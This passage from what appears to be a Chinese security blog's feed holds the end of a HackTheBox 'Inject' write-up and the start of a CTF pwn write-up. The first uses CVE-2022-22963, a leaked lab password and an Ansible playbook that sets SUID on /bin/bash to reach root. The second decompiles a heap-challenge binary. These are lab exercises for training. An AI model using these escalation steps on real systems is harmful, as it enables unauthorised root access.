class="hljs-name">groupId</span>&gt;</span>org.webjars<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>webjars-locator-core<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">build</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">plugins</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">plugin</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-maven-plugin<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>$</span><span class="hljs-template-variable">&#123;parent.version&#125;</span><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">plugin</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">plugins</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">finalName</span>&gt;</span>spring-webapp<span class="hljs-tag">&lt;/<span class="hljs-name">finalName</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">build</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">project</span>&gt;</span></span><br></code></pre></td></tr></table></figure><ul><li>搜索组件<code>spring-cloud-function-web:3.2.2</code>相关的漏洞，发现可以 RCE 的 CVE-2022-22963。</li></ul><p><img src="https://raw.githubusercontent.com/sh0ve1/Images/master/HTB-inject/10.png" alt="image"></p><p><img src="https://raw.githubusercontent.com/sh0ve1/Images/master/HTB-inject/11.png" alt="image"></p><ul><li><p>优化一下shell</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">python3 -c <span class="hljs-string">&#x27;import pty;pty.spawn (&quot;/bin/bash&quot;)&#x27;</span><br><span class="hljs-built_in">export</span> <span class="hljs-attribute">TERM</span>=screen<br></code></pre></td></tr></table></figure></li><li><p>由于权限问题，frank用户无法读取user.txt。利用 <code>phil:DocPhillovestoInject123</code> 切换用户，成功读取到user.txt。</p></li></ul><p><img src="https://raw.githubusercontent.com/sh0ve1/Images/master/HTB-inject/12.png" alt="image.png"></p><h2 id="Root-Privilege"><a href="#Root-Privilege" class="headerlink" title="Root Privilege"></a>Root Privilege</h2><ul><li>上传pspy64，执行发现root执行的命令中多次出现 <code>ansible</code> 和 <code>playbook</code> 等关键词。</li></ul><p><img src="https://raw.githubusercontent.com/sh0ve1/Images/master/HTB-inject/13.png" alt="image.png"></p><blockquote><p>ansible 是一种自动化工具，它可以用于管理和配置远程主机。而 playbook 是 ansible 的一种语言格式，用于定义和描述 ansible 的自动化任务。因此，可以说 ansible 和 Playbook 是密切相关的。<br>具体来说，ansible 使用 playbook 来执行各种任务和配置项，包括远程命令、文件操作、软件安装、服务管理等。playbook 文件通常采用 YAML 格式，用于描述各种任务和配置项，以及任务执行的条件和流程控制等。在 playbook 文件中，可以定义主机、变量、任务、处理程序、模板、文件、角色等各种组件，以实现灵活、可重用和可维护的自动化任务。<br>因此，可以将 playbook 视为 ansible 自动化任务的核心，是实现 ansible 自动化的关键组件之一。而 ansible 则提供了一系列命令和工具，用于管理、配置和执行 playbook，以便实现对远程主机的自动化操作。<br>ansible-parallel 是 ansible 的一个插件，可以在 ansible playbook 执行过程中启用并行执行，以提高任务的执行效率和速度。<br>playbook的具体细节请参考<a href="https://ansible-tran.readthedocs.io/en/latest/index.html">在线文档</a></p></blockquote><ul><li>尝试通过 <code>/usr/bin/python3 /usr/bin/ansible-playbook /opt/automation/tasks/playbook_1.yml</code> 进行提权。但是查看 <code>/opt/automation/tasks/playbook_1.yml</code> 的信息，发现无法通过修改该文件来提权。</li></ul><p><img src="https://raw.githubusercontent.com/sh0ve1/Images/master/HTB-inject/14.png" alt="image.png"></p><ul><li>考虑 <code>/bin/sh -c /usr/local/bin/ansible-parallel /opt/automation/tasks/*.yml</code> 会执行 <code>/opt/automation/tasks/</code> 目录下的所有 yml 文件。查看tasks 目录发现<code>frank</code>用户无法在此创建新文件，但是同在 <code>staff</code> 组的 <code>phil</code> 用户可以在 tasks 文件夹中创建新文件</li></ul><p><img src="https://raw.githubusercontent.com/sh0ve1/Images/master/HTB-inject/15.png" alt="image.png"></p><ul><li><p>创建 <code>playbook_2.yml</code> 文件，使其给 <code>/bin/bash</code> 的属主添加 <code>suid</code> 权限。</p><figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs nestedtext"><span class="hljs-bullet">-</span> <span class="hljs-string">hosts: localhost</span><br>  <span class="hljs-attribute">tasks</span><span class="hljs-punctuation">:</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">name: exp</span><br>      <span class="hljs-attribute">command</span><span class="hljs-punctuation">:</span> <span class="hljs-string">chmod u+s /bin/bash</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sh0ve1/Images/master/HTB-inject/16.png" alt="image.png"></p></li><li><p>随后，执行<code>/bin/bash -p</code> 即可获得root权限</p></li></ul><p><img src="https://raw.githubusercontent.com/sh0ve1/Images/master/HTB-inject/17.png" alt="image.png"></p><h2 id="Surmary"><a href="#Surmary" class="headerlink" title="Surmary"></a>Surmary</h2><ul><li>对于一个应用，不仅要注意其版本信息，也要注意其使用的组件版本信息；</li><li>一定一定要先看各个应用的配置文件，其次是源码；</li><li>除了常规的 suid 提权，内核漏洞等等，还可以使用<code>pspy</code>工具查看目标机器上 root 用户用什么命令创建了什么进程。</li></ul><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul><li><a href="https://github.com/darryk10/CVE-2022-22963">https://github.com/darryk10/CVE-2022-22963</a></li><li><a href="https://blog.csdn.net/qq_44281295/article/details/126573730">https://blog.csdn.net/qq_44281295/article/details/126573730</a></li><li><a href="https://ansible-tran.readthedocs.io/en/latest/index.html">https://ansible-tran.readthedocs.io/en/latest/index.html</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>CVE</category>
      
    </categories>
    
    
    <tags>
      
      <tag>hackthebox</tag>
      
      <tag>ansible</tag>
      
      <tag>spring-boot</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2022春秋杯网络安全联赛-春季赛Pwn题</title>
    <link href="/2022/05/16/2022%E6%98%A5%E7%A7%8B%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%81%94%E8%B5%9B-%E6%98%A5%E5%AD%A3%E8%B5%9BPwn%E9%A2%98/"/>
    <url>/2022/05/16/2022%E6%98%A5%E7%A7%8B%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%81%94%E8%B5%9B-%E6%98%A5%E5%AD%A3%E8%B5%9BPwn%E9%A2%98/</url>
    
    <content type="html"><![CDATA[<h2 id="chunzhiIoT"><a href="#chunzhiIoT" class="headerlink" title="chunzhiIoT"></a>chunzhiIoT</h2><h3 id="0x0-前言"><a href="#0x0-前言" class="headerlink" title="0x0 前言"></a>0x0 前言</h3><h3 id="0x1-程序分析"><a href="#0x1-程序分析" class="headerlink" title="0x1 程序分析"></a>0x1 程序分析</h3><ul><li>checksec pwn : 保护全开</li></ul><figure class="highlight avrasm"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">Arch:</span>     amd64<span class="hljs-number">-64</span>-little<br><span class="hljs-symbol">RELRO:</span>    Full RELRO<br><span class="hljs-symbol">Stack:</span>    Canary found<br><span class="hljs-symbol">NX:</span>       NX enabled<br><span class="hljs-symbol">PIE:</span>      PIE enabled<br></code></pre></td></tr></table></figure><ul><li>libc-2.33.so(2.33-0ubuntu5)</li><li>file pwn<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">pwn</span>: ELF <span class="hljs-number">64</span>-bit LSB shared object, x86-<span class="hljs-number">64</span>, version <span class="hljs-number">1</span> (SYSV), dynamically linked, interpreter /home/sh0ve1/glibc-<span class="hljs-literal">all</span>-in-one/libs/<span class="hljs-number">2</span>.<span class="hljs-number">33</span>-<span class="hljs-number">0</span>ubuntu5_amd64/ld-<span class="hljs-number">2</span>.<span class="hljs-number">33</span>.so, for GNU/Linux <span class="hljs-number">3</span>.<span class="hljs-number">2</span>.<span class="hljs-number">0</span>, BuildID[sha1]=c0bdccc4ca7e2812e393d63a4ef60572f12dbb70, stripped<br></code></pre></td></tr></table></figure></li></ul><h3 id="0x2-程序分析"><a href="#0x2-程序分析" class="headerlink" title="0x2 程序分析"></a>0x2 程序分析</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function">__int64 __fastcall <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">int</span> a1, <span class="hljs-type">char</span> **a2, <span class="hljs-type">char</span> **a3)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-type">char</span> s[<span class="hljs-number">1032</span>]; <span class="hljs-comment">// [rsp+10h] [rbp-410h] BYREF</span><br>  <span class="hljs-type">unsigned</span> __int64 v5; <span class="hljs-comment">// [rsp+418h] [rbp-8h]</span><br><br>  v5 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  <span class="hljs-built_in">setbuf</span>(stdout, <span class="hljs-number">0LL</span>);<br>  <span class="hljs-built_in">setbuf</span>(stdin, <span class="hljs-number">0LL</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Welcome To ChunZhi IOT V2.3.5 &quot;</span>);<br>  <span class="hljs-keyword">do</span><br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Waiting Package...&quot;</span>);<br>    <span class="hljs-built_in">memset</span>(s, <span class="hljs-number">0</span>, <span class="hljs-number">0x400</span>uLL);<br>    <span class="hljs-built_in">read</span>(<span class="hljs-number">0</span>, s, <span class="hljs-number">0x3FF</span>uLL);<br>  &#125;<br>  <span class="hljs-keyword">while</span> ( (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)<span class="hljs-built_in">chuli</span>((__int64)s) );<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>程序的逻辑很简单，就是模拟一个HttpServer，一直循环处理接收到的HTTP数据包。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function">__int64 __fastcall <span class="hljs-title">chuli</span><span class="hljs-params">(__int64 a1)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v2; <span class="hljs-comment">// [rsp+18h] [rbp-28h]</span><br>  <span class="hljs-type">char</span> s[<span class="hljs-number">24</span>]; <span class="hljs-comment">// [rsp+20h] [rbp-20h] BYREF</span><br>  <span class="hljs-type">unsigned</span> __int64 v4; <span class="hljs-comment">// [rsp+38h] [rbp-8h]</span><br><br>  v4 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  <span class="hljs-built_in">memset</span>(s, <span class="hljs-number">0</span>, <span class="hljs-built_in">sizeof</span>(s));<br>  v2 = <span class="hljs-built_in">check</span>((<span class="hljs-type">const</span> <span class="hljs-type">char</span> *)a1, (__int64)s);<br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">mainFunc</span>((__int64)s) | v2;<br>&#125;<br></code></pre></td></tr></table></figure><p>处理函数中，首先对数据包进行格式校验，并将校验结果和数据包关键信息存放在s[24]数组中，然后根据s[24]数组的数据解析数据包,并且只要校验成功或者解析成功就接收下一个数据包。</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><code class="hljs stata">__int64 __fastcall check(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *a1, __int64 a2)<br>&#123;<br>  <span class="hljs-keyword">char</span> *haystack; <span class="hljs-comment">// [rsp+8h] [rbp-28h]</span><br>  int i; <span class="hljs-comment">// [rsp+1Ch] [rbp-14h]</span><br>  <span class="hljs-keyword">char</span> *nextlines; <span class="hljs-comment">// [rsp+20h] [rbp-10h]</span><br>  <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *<span class="hljs-keyword">var</span>; <span class="hljs-comment">// [rsp+28h] [rbp-8h]</span><br>  <span class="hljs-keyword">char</span> *s2a; <span class="hljs-comment">// [rsp+28h] [rbp-8h]</span><br>  <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *s2b; <span class="hljs-comment">// [rsp+28h] [rbp-8h]</span><br><br>  haystack = (<span class="hljs-keyword">char</span> *)a1;<br>  i = 1;<br>  nextlines = strstr(a1, <span class="hljs-string">&quot;\r\n&quot;</span>);<br>  <span class="hljs-keyword">if</span> ( nextlines )<br>  &#123;<br>    nextlines[1] = &#x27; &#x27;;<br><span class="hljs-comment">    *nextlines = 0;</span><br>    nextlines += 2;<br>  &#125;<br>  <span class="hljs-keyword">while</span> ( nextlines &amp;&amp; i &lt;= 15 )<br>  &#123;<br>    <span class="hljs-keyword">var</span> = strtok(haystack, <span class="hljs-string">&quot; &quot;</span>);<br>    <span class="hljs-keyword">if</span> ( i == 1 )<br>    &#123;<br>      <span class="hljs-keyword">if</span> ( !strcmp(<span class="hljs-string">&quot;GET&quot;</span>, <span class="hljs-keyword">var</span>) )<br>      &#123;<br><span class="hljs-comment">        *(_BYTE *)(a2 + 0x10) = 1;</span><br>      &#125;<br>      <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ( *(_BYTE *)(a2 + 0x10) || strcmp(<span class="hljs-string">&quot;HEAD&quot;</span>, <span class="hljs-keyword">var</span>) )<span class="hljs-comment">// 0</span><br>      &#123;<br>        <span class="hljs-keyword">if</span> ( *(_BYTE *)(a2 + 0x10) || strcmp(<span class="hljs-string">&quot;POST&quot;</span>, <span class="hljs-keyword">var</span>) )<span class="hljs-comment">// 2</span><br>        &#123;<br>          <span class="hljs-keyword">if</span> ( *(_BYTE *)(a2 + 0x10) || strcmp(<span class="hljs-string">&quot;PUT&quot;</span>, <span class="hljs-keyword">var</span>) )<span class="hljs-comment">// 3</span><br>          &#123;<br>            <span class="hljs-keyword">if</span> ( *(_BYTE *)(a2 + 0x10) || strcmp(<span class="hljs-string">&quot;DELETE&quot;</span>, <span class="hljs-keyword">var</span>) )<span class="hljs-comment">// 4</span><br>            &#123;<br>              <span class="hljs-keyword">if</span> ( *(_BYTE *)(a2 + 0x10) || strcmp(<span class="hljs-string">&quot;TRACE&quot;</span>, <span class="hljs-keyword">var</span>) )<span class="hljs-comment">// 5</span><br>              &#123;<br>                <span class="hljs-keyword">if</span> ( *(_BYTE *)(a2 + 0x10) || strcmp(<span class="hljs-string">&quot;OPTIONS&quot;</span>, <span class="hljs-keyword">var</span>) )<span class="hljs-comment">// 6</span><br>                &#123;<br>                  <span class="hljs-keyword">if</span> ( *(_BYTE *)(a2 + 0x10) || strcmp(<span class="hljs-string">&quot;CONNECT&quot;</span>, <span class="hljs-keyword">var</span>) )<span class="hljs-comment">// 7</span><br>                  &#123;<br>                    <span class="hljs-keyword">if</span> ( *(_BYTE *)(a2 + 0x10) || strcmp(<span class="hljs-string">&quot;DEV&quot;</span>, <span class="hljs-keyword">var</span>) )<span class="hljs-comment">// 8</span><br>                      <span class="hljs-keyword">return</span> 0LL;<br><span class="hljs-comment">                    *(_BYTE *)(a2 + 0x10) = 8;</span><br>                  &#125;<br>                  <span class="hljs-keyword">else</span><br>                  &#123;<br><span class="hljs-comment">                    *(_BYTE *)(a2 + 0x10) = 7;</span><br>                  &#125;<br>                &#125;<br>                <span class="hljs-keyword">else</span><br>                &#123;<br><span class="hljs-comment">                  *(_BYTE *)(a2 + 0x10) = 6;</span><br>                &#125;<br>              &#125;<br>              <span class="hljs-keyword">else</span><br>              &#123;<br><span class="hljs-comment">                *(_BYTE *)(a2 + 0x10) = 5;</span><br>              &#125;<br>            &#125;<br>            <span class="hljs-keyword">else</span><br>            &#123;<br><span class="hljs-comment">              *(_BYTE *)(a2 + 0x10) = 4;</span><br>            &#125;<br>          &#125;<br>          <span class="hljs-keyword">else</span><br>          &#123;<br><span class="hljs-comment">            *(_BYTE *)(a2 + 0x10) = 3;</span><br>          &#125;<br>        &#125;<br>        <span class="hljs-keyword">else</span><br>        &#123;<br><span class="hljs-comment">          *(_BYTE *)(a2 + 0x10) = 2;</span><br>        &#125;<br>      &#125;<br>      <span class="hljs-keyword">else</span><br>      &#123;<br><span class="hljs-comment">        *(_BYTE *)(a2 + 0x10) = 0;</span><br>      &#125;<br>      s2a = strtok(0LL, <span class="hljs-string">&quot; &quot;</span>);                   <span class="hljs-comment">// 处理url</span><br>      <span class="hljs-keyword">if</span> ( s2a != strchr(s2a, &#x27;/&#x27;) )<br>        <span class="hljs-keyword">return</span> 0LL;<br><span class="hljs-comment">      *(_QWORD *)a2 = s2a;</span><br>      s2b = strtok(0LL, <span class="hljs-string">&quot; &quot;</span>);<br>      <span class="hljs-keyword">if</span> ( !strcmp(s2b, <span class="hljs-string">&quot;HTTP/1.0&quot;</span>) &amp;&amp; !strcmp(s2b, <span class="hljs-string">&quot;HTTP/1.1&quot;</span>) )<br>        <span class="hljs-keyword">return</span> 0LL;<br>      haystack = nextlines;<br>      nextlines = strstr(nextlines, <span class="hljs-string">&quot;\r\n&quot;</span>);<br>      <span class="hljs-keyword">if</span> ( nextlines )<br>      &#123;<br>        nextlines[1] = &#x27; &#x27;;<br><span class="hljs-comment">        *nextlines = 0;</span><br>        nextlines += 2;<br>      &#125;<br>      i = 2;<br>    &#125;                                           <span class="hljs-comment">// i!=1 处理http头</span><br>    <span class="hljs-keyword">else</span><br>    &#123;<br>      <span class="hljs-keyword">if</span> ( !strchr(<span class="hljs-keyword">var</span>, &#x27;:&#x27;) )                  <span class="hljs-comment">// 如果不是http头就退出</span><br>        <span class="hljs-keyword">return</span> 0LL;<br>      haystack = nextlines;<br>      nextlines = strstr(nextlines, <span class="hljs-string">&quot;\r\n&quot;</span>);<br>      <span class="hljs-keyword">if</span> ( nextlines )<br>      &#123;<br>        nextlines[1] = &#x27; &#x27;;<br><span class="hljs-comment">        *nextlines = 0;</span><br>        nextlines += 2;<br>      &#125;<br>      ++i;<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">if</span> ( i == 1 )<br>    <span class="hljs-keyword">return</span> 0LL;<br><span class="hljs-comment">  *(_QWORD *)(a2 + 8) = haystack;</span><br>  <span class="hljs-keyword">return</span> 1LL;<br>&#125;<br></code></pre></td></tr></table></figure><p>根据数据包的数据初始化s[24]数据，数组格式如下图。此外分析HTTP头部时要求其格式为<code>A:B</code>,只有经过多次循环，且格式正确才能返回true<br><img src="https://note.youdao.com/yws/res/17905/WEBRESOURCE8572ea307299407bb0d61a1ad734ab6f" alt="s数组的结构"></p><blockquote><p>其中关键的请求方法：POST时,s[16]&#x3D;2</p></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">int</span> __fastcall <span class="hljs-title">mainFunc</span><span class="hljs-params">(__int64 a1)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-type">int</span> result; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">int</span> para2; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> choice; <span class="hljs-comment">// [rsp+14h] [rbp-2Ch]</span><br>  __int64 v4; <span class="hljs-comment">// [rsp+18h] [rbp-28h]</span><br>  <span class="hljs-type">char</span> *para1; <span class="hljs-comment">// [rsp+38h] [rbp-8h]</span><br>  <span class="hljs-type">const</span> <span class="hljs-type">char</span> *nptra; <span class="hljs-comment">// [rsp+38h] [rbp-8h]</span><br>  <span class="hljs-type">const</span> <span class="hljs-type">char</span> *nptrb; <span class="hljs-comment">// [rsp+38h] [rbp-8h]</span><br>  <span class="hljs-type">const</span> <span class="hljs-type">char</span> *nptrc; <span class="hljs-comment">// [rsp+38h] [rbp-8h]</span><br><br>  <span class="hljs-keyword">if</span> ( *(_BYTE *)(a1 + <span class="hljs-number">0x10</span>) == <span class="hljs-number">2</span> )             <span class="hljs-comment">// POST</span><br>  &#123;<br>    para1 = <span class="hljs-built_in">strtok</span>(*(<span class="hljs-type">char</span> **)(a1 + <span class="hljs-number">8</span>), <span class="hljs-string">&quot;&amp;&quot;</span>);    <span class="hljs-comment">// 以&amp;进行分割 POST参数</span><br>    <span class="hljs-keyword">if</span> ( !para1 )<br>      <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    choice = *para1;<br>    nptra = <span class="hljs-built_in">strtok</span>(<span class="hljs-number">0LL</span>, <span class="hljs-string">&quot;&amp;&quot;</span>);                   <span class="hljs-comment">// 对上次分割剩余的再次分割</span><br>    <span class="hljs-keyword">if</span> ( !nptra )<br>      <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    para2 = <span class="hljs-built_in">atoi</span>(nptra);<br>    v4 = para2;<br>    <span class="hljs-keyword">if</span> ( (<span class="hljs-type">unsigned</span> __int64)para2 &gt; <span class="hljs-number">0x10</span> )<br>      <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span> ( !flag )<br>      <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span> ( choice == <span class="hljs-number">4</span> )<br>    &#123;<br>      <span class="hljs-built_in">delete</span>(para2);                            <span class="hljs-comment">// free</span><br>      <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span> ( choice &lt;= <span class="hljs-number">4</span> )<br>    &#123;<br>      <span class="hljs-keyword">switch</span> ( choice )<br>      &#123;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">3u</span>:<br>          <span class="hljs-built_in">show</span>(para2);                          <span class="hljs-comment">// show</span><br>          <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">1u</span>:                                <span class="hljs-comment">// add</span><br>          nptrb = <span class="hljs-built_in">strtok</span>(<span class="hljs-number">0LL</span>, <span class="hljs-string">&quot;&amp;&quot;</span>);<br>          <span class="hljs-keyword">if</span> ( !nptrb )<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>          <span class="hljs-keyword">if</span> ( (<span class="hljs-type">unsigned</span> __int64)<span class="hljs-built_in">atoi</span>(nptrb) &gt; <span class="hljs-number">0x500</span> )<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>          <span class="hljs-keyword">if</span> ( !<span class="hljs-built_in">strtok</span>(<span class="hljs-number">0LL</span>, <span class="hljs-string">&quot;&amp;&quot;</span>) )<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>          ((<span class="hljs-built_in">void</span> (__fastcall *)())((<span class="hljs-type">char</span> *)&amp;alloc + <span class="hljs-number">1</span>))();<span class="hljs-comment">// malloc</span><br>          <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">2u</span>:<br>          nptrc = <span class="hljs-built_in">strtok</span>(<span class="hljs-number">0LL</span>, <span class="hljs-string">&quot;&amp;&quot;</span>);<br>          <span class="hljs-keyword">if</span> ( !nptrc )<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>          <span class="hljs-built_in">edit</span>(v4, nptrc);<br>          <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>      &#125;<br>    &#125;<br>  &#125;<br>  result = *(<span class="hljs-type">unsigned</span> __int8 *)(a1 + <span class="hljs-number">0x10</span>);<br>  <span class="hljs-keyword">if</span> ( (_BYTE)result == <span class="hljs-number">8</span> )                     <span class="hljs-comment">// DEV</span><br>  &#123;<br>  